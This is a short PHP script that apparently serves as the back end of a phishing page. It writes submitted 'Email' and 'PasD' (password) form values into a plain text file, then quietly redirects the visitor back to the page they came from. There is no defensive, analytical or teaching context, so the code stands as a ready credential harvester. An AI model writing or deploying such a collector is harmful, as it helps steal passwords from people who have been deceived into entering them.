<?php
$myfile = fopen("MyFile.txt", "w") or die("Unable to open file!");
if(isset($_POST['Email'])){
   fwrite($myfile ,$_POST["Email"]); 
 fwrite($myfile ,"\n"); 
 fwrite($myfile ,$_POST["PasD"]); 
 fwrite($myfile ,"\n");
 fclose($myfile);; 
 header("Location:". $_SERVER['HTTP_REFERER']); exit; 
}
else{
echo 'Retry!';
}
fclose($myfile);
?>